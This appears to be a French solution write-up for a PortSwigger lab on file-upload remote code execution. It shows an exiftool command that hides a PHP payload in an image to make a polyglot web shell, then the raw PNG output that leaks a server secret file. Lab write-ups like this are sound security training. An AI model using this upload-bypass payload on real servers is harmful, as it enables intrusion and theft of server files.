# Lab

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

## Solution

Lorsqu'on essaie d'upload un fichier php, on obtient cette erreur : `Error: file is not a valid image Sorry, there was an error uploading your file.`.

Ce qui laisse suggerer que le serveur ne vérifie pas le content-type du fichier mais lis le contenu.

On peut essayer de faire un polyglot php/jpg avec exiftool :

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" "C:\Users\mxce\Pictures\logo.png" -o polyglot.php
```

On upload ce fichier et on y accède via son URI.

L'image est affichée au format brut et on peut voir le contenu du fichier `/home/carlos/secret` :

```
�PNG  IHDR�y'�yPLTEp���������������}�v�j�g�Z�Y�K� 1m+h$c ^ 2o"`E~"a+a/>YMPVKOV#4T/S(SI�)W 0l+c,@^1d(T)U.Z.f4Kf/Otbx�l��o��m��s��v�����u��0���ŉ�����������tx������xv{qu}������������������������������������������������������|�w{�pu|hhoXZ`^Pbv��ý���������t6X�Y>StEXtCommentSTART f0ENN3g9gMBiJWX8z13aepJE7qjSLCiO ENDԴ`PbIDATx��kS����m��S��#7u�᠞����H$��PH�����I�k�K ��@������o��-�@��r�Gߣ����{�=��GW?.��|܀7?.�n|�2g-�B"��z���d)Q|�蚵u>�����/�"�@�K���7�YqC>��|��y� ���_J��BWqF���w&SN��Q���W��XC^�g^^�ɧ�_�>���WDWj�!/�^|�L^����!'Gxy��%#,�XI��o���?�*�\�3����ln~Ƿ*��T��g��S�z���VF�׃�Y8;c�a�&9<��#q��%}�'?�~�6����F��~ȋ�3��{��� �_��E���8����5:b误��EG����Q��Z2T<�䰦w]����^X�Rw����nG�%C���#�=)�]iG���%?[yH���~!�>}.�$:�}0&䩵�e�����Itt���7����W����.�U`m�O���;�.�_�M�c�����:��F���\�-���>�+~Fr��n��pL�e��D�;B9D�W��<���׸O�W2�H����%��C^�q{��T*�<�7!��A���ŝ�L&�L�o�?�~M��\}~����_���1�'��ȿ}c���6N ��@g���Y�v�9yr������m�Tv�8xC�I���n2�~���v�@�hZJT��|��t.D��t� l=G���u�Tǚ,�&������������+C�!���v�ڙ��OOV2v�v�5YJ$�>,�ӓ`�T&B~�J:+l�%:���V��y� ���uND���y��m��J�N����7�N=' �:`���0����x ,��S�o�T:��$�J�tD?�"�!��з��D`����:��ё~a䯂~H0�q�?m��"��vrÿiN���^/�Pȝ�OS�kQ%�����-��y3�ܹ^X:`�CH��I���a��-�c�����]�Ξ�dbع�$By�J�#;ɰE������ ]Ȧz�!��g&e�n��%;��>�Xd1�X��3A��Yk?m'��K�~�:�L�8�-� l�ۍbx���聘At2R��L����B���ř� �si1>�� �� l�"ƶB��{+�E�<��` n��4�j�p�^�Nɺ%;w���b�05�͆��ܾ���˧x�R.�}=���Vៈ7����5�t�u�v�E���l�3I��!�3�o��$����]�������-qz:����m�iP�,|���h~S���sqQ�+�)��˫1���>g]�ݾ����a�����Bd[�t^���gBi��??�P���ch�������C~/|����L��c���(�<�� ����7A/�qױ-˪9��(f�(s7#T����v�a�9��x�5�َ���/Ę��ȱ詊j�.�ǩ(G��뛧O�]�sa�|�DsY�;�K������g��'��3_�PF�� ���A^�{Re� 5��n��.�A;��,W:M�9���i�����������j ؋�Wn�㑭N�W��X!/��$:�7;jws�Y?��g��f�h��B/�馧���EL�4�ޟ���:X@S�Z�t��;ݙ>�5�p��g�Ȟ����UR��GO�F���k)�Y���K��x4�tT"�v�kO���V��E�B.��i���n��?��IH�°�P���T;�\,���E�� ���������(1˼�6���aN����}O��fEϨ�Q���⠸D�\rTaRHqv��/E����tZ��N'h����ዊ���������f-�x�U�z'�o�˱��2��:��� �4 ]^\c�:������*��A�ǅR\�rTS����p�� �4�[-�[S=�TU'����R�3��%�4a�Z̉솭rC$R����F�k��ŝ^�ğ��I���D��5p�M|��E�2}��X��:�y���lU���U1Dr�=�KEd�J`�%�gQ�A5r�!��!��� 9ag;k�C5��<���nK�17��9�U�juߜ�V��d@��,J�In.��;G����Ez!�;)�\\^^^�̋���7'��qD�B���#���ߣ��qu�h4�/ �K>>�_m.����$u����N�� ��!r{���L�`������E {&� �������xם����@���v��&t�����o�n��^���ג���,c���q΂��?A���v�7�w��7de��b���i�=�7v�Z�]7�����6�9y��D�w�wn >����Xz��9�9�J�3C+~�n�}F4b�wx��u=5{�K�=4- ?��Y~KL�:�����ͦ��7�#�I�A\�� :�6裉��N&W4T>C�����{��S��C�j��04�6��[[�1%"]C�F��"#�gxKM�TJI��m6pi�Eb5�K ó���ț�(q�){�ך@׺���}Ȁ�MT��y� �=��B��,}���Vz�F��'�(�%�`����y|t��6��z����4&�3��M��}U�:p/��B\�n����:5D���V�^+�w�5!-��Z\��4��Y��~ߐ� �#�\�=��y� � �#��7��۩=o0��U��w���á�X��٧Hnsg=@�y~��J9Z,'pM�~���N|�f0x:�h/!�hrb�5�䀌��s�� ��p ��`h;*Ps���`*u<�>�I+myS���]fVF)�WxC�F5�v��U�d2�mp�v_ON�錆w�"��[�{���'/H��E�3Sɠ�Հ]����l@[ �캣2�2X�IQ!��(�EJ(:ZF �0Ym����H�t:�����`�� mb��N�Qy�D��$�>"�$yg������ߕ ���T��ԝl �1e��M�q� �(�`;�0t(�ͦ���oq����\�C�j�j�T�a�`��*��,扯�2��C���hd(QU�f)Ƶ��E�8e�BK:��#���0*|K��C���;d�i���dq������놢}�vh���G���X��*����C"� s�2N������lE��!���ViP�bPTfѕ���<"�g�¥*�1� �4��#�u�/��h
```

On y lit : `START f0ENN3g9gMBiJWX8z13aepJE7qjSLCiO END`.